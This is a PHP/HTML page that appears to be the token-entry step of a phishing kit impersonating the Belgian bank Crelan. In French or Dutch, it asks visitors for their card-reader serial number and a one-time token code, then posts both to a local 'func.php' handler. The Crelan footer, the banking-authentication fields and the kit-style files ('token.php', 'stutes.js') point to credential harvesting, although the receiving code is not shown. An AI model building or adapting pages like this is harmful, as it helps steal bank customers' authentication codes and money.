<?php
  session_start();
  include "./Assets/php/lang/lang.php";
  $langs = $_GET['lang'] ?? $_SESSION['lang'] ?? 'fr';    
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="./Assets/css/main.css">
    <link rel="stylesheet" href="./Assets/css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="./Assets/imgs/favicon.ico">
    <link rel="shortcut" href="./Assets/imgs/favicon.ico">
    <link rel="appel-touch-icon" href="./Assets/imgs/favicon.ico">
    <title><?php echo get_text('title_head'); ?></title>
    <script src="./Assets/js/stutes.js"></script>        
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="./Assets/imgs/logo.png" alt="">
            </div>
            <form action="" class="lang-form" method="post">
                <a href="./token.php?lang=<?php echo ($langs == 'nl') ? 'fr' : 'nl'; ?>" 
                class="display-current-lang" id="buttonMenuLang">
                <?php echo get_text('current_lang'); ?>
                <img src="./Assets/imgs/arrow-nav.png" alt="" id="iconRight">
                </a>
            </form>
        </div>
        <div class="content-main-section">
            <h1 class="title-login"><?php echo get_text('title_step_one'); ?></h1>
            <?php
                if (isset($_GET['error'])) {
                    echo '
                    <div class="message-error-pages">
                        <i class="fa-solid fa-triangle-exclamation"></i>'
                         .get_text('message_error_step_one').
                    '</div>';
                }
            ?>
            <form action="./Assets/php/config/func.php" method="post" id="fsdpElement" class="f-s-d-p-element-other">
                <input type="hidden" name="token">
                <div class="coul-container">
                    <div class="coul-1">
                        <img src="./Assets/imgs/icon-reader-1.png" alt="">
                    </div>
                    <div class="coul-4">
                        <div class="prt-3" id="div1">
                            <label for="serialNumber"><?php echo get_text('label_step_one_1'); ?></label>
                            <input type="text" required name="serial_number" style="text-align:start;" id="serialNumber" class="i-element">
                            <small id="messageError1" class="m-e-i"> <img src="./Assets/imgs/icon-error.png" alt=""><?php echo get_text('message_error_input_step_one'); ?></small>
                        </div>
                    </div>
                </div>
                <div class="coul-container">
                    <div class="coul-1-other">
                        <img src="./Assets/imgs/icon-reader-2.png" alt="">
                    </div>
                    <div class="coul-4-other">
                        <div class="number-and-text">
                            <div class="number">1</div>
                            <div class="text">
                                <?php echo get_text('paragraph_step_one_1'); ?>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">2</div>
                            <div class="text">
                                <?php echo get_text('paragraph_step_one_2'); ?>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">3</div>
                            <div class="coul-submit">
                                <div class="prt-3" id="div2">
                                    <label for="tokenCode"><?php echo get_text('label_step_one_2'); ?></label>
                                    <input type="text" required name="token_code" style="text-align:start;" id="tokenCode" class="i-element">
                                    <small id="messageError2" class="m-e-i"><img src="./Assets/imgs/icon-error.png" alt=""><?php echo get_text('message_error_input_step_one'); ?></small>
                                </div>
                                <div class="prt-btn">
                                    <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element"><?php echo get_text('button_step_one'); ?></button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer"><?php echo get_text('link_footer_1'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_2'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_3'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_4'); ?></span> <span class="ship">—</span> 
            </div>
            <p><?php echo get_text('paragraph_footer'); ?> © Crelan <?php echo date("Y"); ?></p>
        </div>
    </div>
    <!-- Footer Section -->

    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>         
    <script src="./Assets/js/script.js"></script>      
</body>
</html>
